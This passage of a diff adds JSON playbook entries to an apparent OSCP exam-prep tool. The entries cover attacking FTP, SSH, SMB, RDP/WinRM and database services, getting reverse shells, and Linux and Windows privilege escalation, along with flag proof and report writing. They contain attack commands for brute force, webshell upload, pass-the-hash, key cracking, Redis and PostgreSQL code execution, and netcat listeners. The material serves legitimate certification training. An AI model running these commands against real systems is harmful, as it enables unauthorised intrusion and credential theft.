+      "body": "## 1. Banner + anonymous\n    nmap -p21 -sCV --script ftp-anon,ftp-syst \"$TARGET\"\n    ftp $TARGET        # try user: anonymous  pass: anything\n    # inside: binary ; ls -la ; mget *      (get everything)\n    oscp atlas ftp\nAnonymous FTP often holds configs, backups, source, or user files -> creds / password reuse.\n\n## 2. Version -> exploit\n    searchsploit <ftp software and version>     # e.g. vsftpd 2.3.4 (backdoor), ProFTPD mod_copy\n`oscp atlas searchsploit`. Note the exact banner from `-sCV`.\n\n## 3. FTP as a lever\n- **Writable FTP mapped to a webroot** = upload a webshell and browse it (the classic FTP+HTTP combo).\n  Check if the HTTP server serves what you can write via FTP.\n- **mod_copy (ProFTPD)**: `SITE CPFR`/`CPTO` to copy files into the webroot even without a login.\n- **Credentials found elsewhere** -> try them here (and vice-versa).\n\n## 4. Brute (if in scope)\n    hydra -L users.txt -P rockyou.txt ftp://$TARGET -f        # oscp atlas hydra\n\n## Pattern\n\"Anonymous? grab everything. Version? searchsploit. Writable + webroot? upload a shell. Creds? reuse.\"\n(See: attack-http, foothold-logic, creds-hunting in `oscp manual`.)"
+    },
+    {
+      "id": "attack-ssh",
+      "topic": "service-attack",
+      "title": "Port 22 (SSH) — the attack plan",
+      "brief": "User enumeration, key reuse, and when brute force is worth it",
+      "tags": [
+        "ssh",
+        "service",
+        "keys",
+        "brute",
+        "creds"
+      ],
+      "body": "## 1. Banner + audit\n    nmap -p22 -sCV \"$TARGET\" ; ssh-audit $TARGET        # oscp atlas ssh-audit\nThe version maps the OS/distro; very old OpenSSH has user-enum CVEs. SSH itself is rarely the *bug* —\nit's where **found credentials or keys** pay off.\n\n## 2. Credentials & keys (the real path)\n- **Creds found elsewhere** (web, FTP, configs, DB) -> `ssh user@$TARGET`. Password reuse is the\n  number-one SSH win.\n- **A private key you looted** (id_rsa in a readable home/backup/web):\n      chmod 600 id_rsa ; ssh -i id_rsa user@$TARGET\n  Encrypted key? `ssh2john id_rsa > h ; john --wordlist=rockyou.txt h` (`oscp atlas john`).\n- **authorized_keys writable** (via another bug) -> drop your public key.\n\n## 3. Brute force (only when hinted, and in scope)\n    hydra -l <user> -P /usr/share/wordlists/rockyou.txt ssh://$TARGET -t4 -f    # oscp atlas hydra\nUse a **known username** and a targeted list; blind SSH brute is slow and noisy. Build a user list\nfrom the web app / enumeration first.\n\n## 4. After you're in\n    oscp methods show shell-tty             # you likely already have a TTY; confirm context\n    oscp methods show post-foothold-enum\n\n## Pattern\n\"SSH = the payoff for loot. Reuse creds, use/crack a stolen key, drop a key if you can write\nauthorized_keys; brute only with a known user.\" (See: ssh-keys, ssh-agent-forwarding in `oscp manual`.)"
+    },
+    {
+      "id": "attack-smb",
+      "topic": "service-attack",
+      "title": "Ports 139/445 (SMB) — the attack plan",
+      "brief": "Shares, null sessions, versions and the SMB-to-shell routes",
+      "tags": [
+        "smb",
+        "service",
+        "shares",
+        "null-session",
+        "windows"
+      ],
+      "body": "## 1. Version (is it exploitable outright?)\n    nmap -p445 --script smb-protocols,smb2-security-mode,smb-os-discovery \"$TARGET\"\n    nxc smb $TARGET                         # banner, OS, signing, domain   (oscp atlas nxc)\nOld SMBv1 / unpatched Windows -> **EternalBlue (MS17-010)**: `oscp manual show eternalblue-ms17010`\n(nmap `--script smb-vuln-ms17-010` to confirm).\n\n## 2. Shares & null session\n    nxc smb $TARGET -u '' -p '' --shares            # null session shares\n    smbclient -L //$TARGET/ -N ; smbmap -H $TARGET  # list + perms  (oscp atlas smbclient / smbmap)\n    smbclient //$TARGET/share -N                    # connect; mget * to loot\n    oscp manual show smb-enumeration-checklist\nReadable shares leak configs, scripts, backups, and creds. **Writable** shares can take a payload.\n\n## 3. With credentials\n    nxc smb $TARGET -u user -p pass --shares        # what this account can read\n    nxc smb $TARGET -u user -p pass --rid-brute     # usernames\n    # exec (if admin):  impacket-psexec / wmiexec / smbexec user:pass@$TARGET   (oscp show ad)\n    oscp show smb   ·   oscp show ad\n\n## 4. SMB-to-shell routes\n- **Admin creds/hash** -> psexec/wmiexec/smbexec = SYSTEM (`oscp atlas impacket-psexec`).\n- **Writable share mapped to a web/app path** -> drop a payload.\n- **Creds from a share** -> reuse on RDP/WinRM/SSH/DB.\n\n## Pattern\n\"Version (MS17-010?) -> null-session shares -> loot/creds -> with creds: enumerate, rid-brute, then\npsexec/wmiexec if admin.\" (See: attack-rdp-winrm, pass-the-hash-ticket in `oscp manual`.)"
+    },
+    {
+      "id": "attack-rdp-winrm",
+      "topic": "service-attack",
+      "title": "RDP (3389) & WinRM (5985) — the attack plan",
+      "brief": "Using credentials or hashes to get an interactive Windows session",
+      "tags": [
+        "rdp",
+        "winrm",
+        "windows",
+        "creds",
+        "pass-the-hash"
+      ],
+      "body": "## These are *access* services — you need a credential first\nRDP and WinRM rarely have a pre-auth bug on OSCP; they're how you **use** creds/hashes you already\nfound (web, SMB, shares, DB, kerberoast). Get a credential, then:\n\n## RDP (3389)\n    xfreerdp /u:user /p:pass /v:$TARGET /cert:ignore /dynamic-resolution +clipboard    # oscp atlas xfreerdp\n    xfreerdp /u:user /pth:<NThash> /v:$TARGET /cert:ignore     # pass-the-hash (if restricted-admin)\n    nmap -p3389 --script rdp-ntlm-info \"$TARGET\"               # leaks hostname/domain\n    # drag-drop/clipboard lets you move tools in.\n\n## WinRM (5985/5986) — the quiet favourite\n    nxc winrm $TARGET -u user -p pass            # validate creds for WinRM\n    evil-winrm -i $TARGET -u user -p pass        # interactive PS shell   (oscp atlas evil-winrm)\n    evil-winrm -i $TARGET -u user -H <NThash>    # pass-the-hash\nBeing in **Remote Management Users** (or local admin) grants WinRM. evil-winrm has upload/download\nand `-s` for scripts.\n\n## After the session\n    oscp manual show windows-privesc-checklist   # whoami /priv -> tokens/services/tasks/creds\n    oscp methods show privesc-windows-path\n\n## Pattern\n\"Find a credential/hash elsewhere -> xfreerdp (or PtH) for RDP, evil-winrm for WinRM -> then local\nWindows privesc.\" (See: attack-smb, pass-the-hash-ticket, windows-potato-attacks in `oscp manual`.)"
+    },
+    {
+      "id": "attack-databases",
+      "topic": "service-attack",
+      "title": "Databases (MySQL/MSSQL/Postgres/Redis/Mongo)",
+      "brief": "Enumerating and exploiting exposed database services",
+      "tags": [
+        "database",
+        "mysql",
+        "mssql",
+        "postgres",
+        "redis",
+        "mongodb"
+      ],
+      "body": "## General approach\nConnect (try default/blank/found creds) -> enumerate users & databases -> read secrets -> escalate to\nfile write / command execution. Creds live in web configs (wp-config.php, .env, settings.py).\n\n## MySQL/MariaDB (3306)\n    mysql -h $TARGET -u root -p                 # try blank / 'root' / found creds\n    # inside: show databases; use <db>; show tables; select * from users;\n    # RCE if FILE priv + webroot known -> oscp manual show sqli-to-rce  (INTO OUTFILE a webshell)\n\n## MSSQL (1433)\n    impacket-mssqlclient user:pass@$TARGET -windows-auth     # oscp atlas impacket-mssqlclient\n    nxc mssql $TARGET -u user -p pass -x whoami\n    oscp manual show mssql-abuse        # xp_cmdshell, impersonation, linked servers (-> SYSTEM)\n\n## PostgreSQL (5432)\n    psql -h $TARGET -U postgres          # try postgres/postgres\n    # RCE as superuser:  COPY (SELECT '') TO PROGRAM 'id';   (oscp manual show sqli-to-rce)\n    oscp manual show redis-exploitation  # (and see below for Redis)\n\n## Redis (6379)\n    redis-cli -h $TARGET                 # often no auth\n    # INFO; KEYS *; CONFIG GET dir  -> abuse: write an SSH key or webshell via CONFIG SET dir/dbfilename\n    oscp manual show redis-exploitation\n\n## MongoDB (27017)\n    mongo mongodb://$TARGET             # show dbs; use <db>; db.<col>.find()   (oscp atlas mongo)\n    oscp manual show nosql-injection    # when it's behind a web API\n\n## Pattern\n\"Connect (default/found creds) -> dump users/secrets -> reuse creds -> escalate to file-write/exec\n(OUTFILE, xp_cmdshell, COPY PROGRAM, CONFIG SET).\" (See: sqli-to-rce, mssql-abuse, database-enum.)"
+    },
+    {
+      "id": "foothold-logic",
+      "topic": "access",
+      "title": "Turning a bug into a shell",
+      "brief": "From webshell/command-exec to a stable reverse shell you control",
+      "tags": [
+        "foothold",
+        "reverse-shell",
+        "webshell",
+        "listener",
+        "hacktools"
+      ],
+      "body": "## The goal\nConvert whatever primitive you have (file upload, command injection, SQLi->OUTFILE, admin panel) into\nan **interactive reverse shell** on your listener.\n\n## 1. Start the listener first\n    oscp hacktools listener 4444           # nc -lvnp 4444 (and rlwrap/pwncat options)\n    # or:  nc -lvnp 4444\n\n## 2. Pick a reverse shell for the target\n    oscp hacktools revshell $LHOST 4444    # bash/python/php/perl/powershell variants, LHOST filled\nChoose the language the box actually has (php on a PHP app, powershell on Windows). If you only have a\n**webshell**, run the revshell command *through* it (`?cmd=<revshell>`), URL-encoding as needed.\n\n## 3. Special cases\n- **Windows**: `oscp hacktools windows $LHOST 4444` / a powershell one-liner; `oscp hacktools msfvenom`\n  for an .exe if you can upload+run.\n- **Egress filtered**: try common ports (443, 53), or a bind shell, or pivot (`oscp show pivot`).\n- **Encoding**: wrap tricky payloads with `oscp hacktools encode` (base64) and decode on target.\n\n## 4. Catch it, then stabilise\n    oscp methods show shell-tty            # upgrade to a real TTY immediately\n\n## Pattern\n\"listener up -> pick the right-language revshell (hacktools) -> fire it through the bug -> stabilise.\"\nA shell you can't type in properly costs you more time than getting it. (See: reverse-and-bind-shells,\nshell-tty.)"
+    },
+    {
+      "id": "post-foothold-enum",
+      "topic": "post-foothold",
+      "title": "The first 10 minutes on a new box",
+      "brief": "What to run and read the moment you land, before trying any privesc",
+      "tags": [
+        "enumeration",
+        "linpeas",
+        "winpeas",
+        "context",
+        "creds",
+        "loot"
+      ],
+      "body": "## 1. Orient (who/where/what am I)\n    oscp methods show shell-context        # id, whoami, hostname, $0, sudo -l\n    id ; whoami ; hostname ; ip a ; sudo -l 2>/dev/null\nGrab the first flag now if reachable: `cat /home/*/user.txt` / `type C:\\Users\\*\\Desktop\\local.txt`.\n\n## 2. Run the automated enumerator (while you read manually)\n    # Linux:\n    oscp atlas pspy          # watch for root cron/processes\n    ./linpeas.sh | tee linpeas.out        # transfer it first: oscp hacktools transfer / oscp show transfer\n    oscp manual show peass-reading        # how to read the output (don't drown in it)\n    # Windows:\n    .\\winPEAS.exe  (or PowerUp.ps1 / Seatbelt.exe)\n\n## 3. Work the manual checklist in parallel\n    oscp manual show linux-enum-checklist      # or windows-privesc-checklist\nKey reads: `sudo -l`, SUID (`find / -perm -4000 2>/dev/null`), cron, writable files, running\nservices/ports (`ss -tlnp`), `/etc/passwd`, config files with creds.\n\n## 4. Hunt credentials & reuse them\n    oscp manual show creds-hunting\nHistory files, configs (.env, wp-config, web.config), DBs, backups, SSH keys, `.bash_history`,\n`/var/mail`. **Every credential gets tried on every service/user** (password reuse wins boxes).\n\n## 5. Note internal reach (for later pivot)\n    ss -tlnp ; arp -a ; cat /etc/hosts     # services bound to localhost = privesc or pivot targets\n    oscp show pivot\n\n## Pattern\n\"Orient -> automated (linpeas/winpeas) + manual checklist in parallel -> hunt & reuse creds -> note\nlocalhost services.\" Enumeration here *is* the privesc. (See: linux-enum-checklist, creds-hunting.)"
+    },
+    {
+      "id": "privesc-linux-path",
+      "topic": "privesc-linux",
+      "title": "Linux privesc — the decision tree",
+      "brief": "Map each enumeration finding to the exact technique and oscp command",
+      "tags": [
+        "privesc",
+        "linux",
+        "root",
+        "decision-tree",
+        "gtfobins"
+      ],
+      "body": "## Run the checks, then branch on what you find\n    oscp manual show linux-enum-checklist      # the full enum pass (linpeas covers most)\n\n## Finding -> technique\n| You found | Do this |\n| --- | --- |\n| `sudo -l` shows a binary | `oscp methods show gtfobins-logic` · `oscp gtfo <binary>` |\n| sudo version is old | `oscp manual show sudo-known-cves` (Baron Samedit, -u#-1) |\n| SUID binary (`find / -perm -4000`) | `oscp gtfo <binary>` · `oscp manual show suid-concept` |\n| a capability (`getcap -r /`) | `oscp manual show capabilities-deepdive` |\n| writable /etc/passwd or /etc/shadow | `oscp manual show writable-passwd-shadow-privesc` |\n| member of `docker` / `lxd` group | `oscp manual show docker-socket-privesc` · `lxd-lxc-privesc` |\n| a root cron / writable script | `oscp manual show cron-scheduling` · `writable-cron-walkthrough` |\n| a root process calling a relative bin | `oscp manual show path-env-hijacking` |\n| a root job with `*` in a writable dir | `oscp manual show wildcard-injection-privesc` |\n| NFS `no_root_squash` | `oscp manual show nfs-no-root-squash` |\n| kernel looks old | `oscp manual show kernel-exploits` (last resort) |\n| creds in history/config | reuse them: `su <user>` / ssh (`oscp manual show creds-hunting`) |\n\n## The order to try\n1. `sudo -l` (fastest, cleanest win) -> 2. cron/writable scripts -> 3. SUID/capabilities ->\n4. group abuse (docker/lxd) -> 5. writable sensitive files -> 6. service/path/wildcard ->\n7. kernel exploit **only** when the rest is exhausted (can crash the box).\n\n## Pattern\n\"Enumerate -> match the finding to its technique above -> try the clean wins before kernel exploits.\"\nMost Linux roots are `sudo -l` + GTFOBins or a cron/SUID misconfig. (See: gtfobins-logic, suid-concept,\nsudoers-logic.)"
+    },
+    {
+      "id": "privesc-windows-path",
+      "topic": "privesc-windows",
+      "title": "Windows privesc — the decision tree",
+      "brief": "Map winPEAS findings to the technique and oscp command",
+      "tags": [
+        "privesc",
+        "windows",
+        "system",
+        "decision-tree",
+        "tokens"
+      ],
+      "body": "## Run the checks, then branch\n    oscp manual show windows-privesc-checklist     # whoami /priv, /groups, winPEAS passes\n\n## Finding -> technique\n| You found | Do this |\n| --- | --- |\n| `SeImpersonatePrivilege` (service acct, IIS/MSSQL) | `oscp manual show windows-potato-attacks` |\n| `SeBackup/SeRestore/SeDebug/SeTakeOwnership` | `oscp manual show windows-token-privesc` |\n| unquoted service path | `oscp manual show unquoted-service-path` |\n| weak service perms / writable service binary | `oscp manual show windows-service-privesc` |\n| a writable scheduled task | `oscp manual show windows-scheduled-tasks` |\n| AlwaysInstallElevated / autoruns | `oscp manual show windows-autoruns-registry` |\n| GPP cpassword / unattend / saved creds | `oscp manual show windows-gpp-laps` · `browser-and-vault-creds` |\n| a missing DLL in a writable path | `oscp manual show windows-dll-hijacking` |\n| old build + a matched CVE | `oscp manual show kernel-exploits` (wesng) |\n\n## In a domain (AD)? different game\n    oscp show ad\n    oscp manual show ad-killchain          # map -> roast -> move -> DA\n    oscp methods show attack-rdp-winrm     # use creds/hashes to move\nRoasting, delegation, ACL abuse: `oscp manual show kerberoasting-deep` · `asreproasting` ·\n`adcs-esc-attacks` · `ad-acl-abuse`.\n\n## Pattern\n\"whoami /priv first (SeImpersonate = near-instant SYSTEM) -> then services/tasks/registry/creds ->\nDLL -> kernel last. In AD, pivot to the domain kill chain.\" (See: windows-potato-attacks,\nwindows-privesc-checklist.)"
+    },
+    {
+      "id": "flags-and-proof",
+      "topic": "proof",
+      "title": "Flags, proof files & submission",
+      "brief": "Where the flags are, how to prove each one, and not losing earned points",
+      "tags": [
+        "proof",
+        "flag",
+        "exam",
+        "local.txt",
+        "proof.txt"
+      ],
+      "body": "## Where the flags live\n- **Linux**: `/home/<user>/user.txt` (or `local.txt`) and `/root/proof.txt` (or `root.txt`).\n- **Windows**: `C:\\Users\\<user>\\Desktop\\local.txt` and `C:\\Users\\Administrator\\Desktop\\proof.txt`.\n      cat /root/proof.txt            type C:\\Users\\Administrator\\Desktop\\proof.txt\n\n## Prove it properly (or you lose the points)\nCapture the flag **together with evidence of who/where you are**, in one screenshot:\n    # Linux\n    whoami ; hostname ; ip addr | grep inet ; cat /root/proof.txt\n    # Windows\n    whoami & hostname & ipconfig & type C:\\Users\\Administrator\\Desktop\\proof.txt\nThe screenshot must show the **command, its output, your IP, and the flag** in the same frame. A bare\nflag string with no context may not be accepted.\n\n## Workflow discipline\n1. **Screenshot the instant** you get each shell and each flag — don't \"come back to it\".\n2. Copy each proof hash into your notes **with the target IP** immediately.\n3. Record the **exact steps** as you go — you must reproduce them in the report; you can't re-pwn from\n   memory at 2am.\n\n## Submitting (exam)\nPaste the proof hashes into the exam control panel's submission boxes as you get them (they're how\npoints are tracked). Read your exam guide for the exact process and which machines award what.\n\n## Pattern\n\"Flag + whoami + ip in one screenshot -> hash into notes with the IP -> record steps now -> submit in\nthe panel.\" (See: oscp-exam-strategy, note-taking-reporting in `oscp manual`, report-writing.)"
+    },
+    {
+      "id": "report-writing",
+      "topic": "reporting",
+      "title": "Writing the OSCP report",
+      "brief": "Structure, per-machine walkthroughs, and making every step reproducible",
+      "tags": [
+        "reporting",
+        "documentation",
+        "exam",
+        "template",
+        "screenshots"
+      ],
+      "body": "## Why the report is half the exam\nYou get ~24 hours after hacking to document it. **Points come from the report, not the shell** — an\nunreported root scores zero. Write it so an assessor can **reproduce every step** from your words and\nscreenshots alone.\n\n## Use the official template\nStart from the **Offensive Security report template** (.docx/.md). Don't invent a format. Typical\nsections:\n1. **Title / contact / confidentiality**.\n2. **Executive summary** — plain-language outcome.\n3. **(If required) course exercise & lab documentation** — for bonus points, if you opted in.\n4. **Per-machine walkthrough** — one section each (the bulk of the marks).\n5. **Appendices** — long outputs, custom scripts.\n\n## Per-machine section (the pattern that scores)\nFor each target, in order:\n- **Target IP + which flags you got** (local/proof hashes).\n- **Enumeration** — the nmap output and what stood out.\n- **Exploitation** — the exact vuln, the **exact commands** (copy-paste-able), and the payload.\n  Modified a public exploit? include the changes and the source.\n- **Proof** — the `whoami`+`ip`+flag screenshot.\n- **Privilege escalation** — the finding, the technique, the commands, the proof screenshot.\nEach claim = a command + its screenshot. \"I got root\" without the reproducible steps = no points.\n\n## Capture as you go (not after)\n- Screenshot every shell/flag **when it happens**; name files by IP.\n- Keep a running command log per host (`script`/`tee`, or `oscp` copy-to-clipboard into your notes).\n- `oscp manual show note-taking-reporting` for a note structure.\n\n## Do / don't\n- **Do**: number steps, show commands *and* output, state the IP in each screenshot, redact nothing\n  that proves the step.\n- **Don't**: rely on memory, paste a flag with no context, skip privesc reproduction, or submit a\n  machine you can't reproduce.\n\n## Deliver\nExport to **PDF**, name it per the exam's required filename, zip if asked, and submit before the\ndeadline. Submit **early** — upload issues at the buzzer cost people their pass.\n\n## Pattern\n\"Official template -> per-machine: enum + exact commands + proof screenshot + privesc, all\nreproducible -> capture as you go -> PDF and submit early.\" (See: oscp-exam-strategy, flags-and-proof,\nnote-taking-reporting.)"
+    }
+  ]
+}
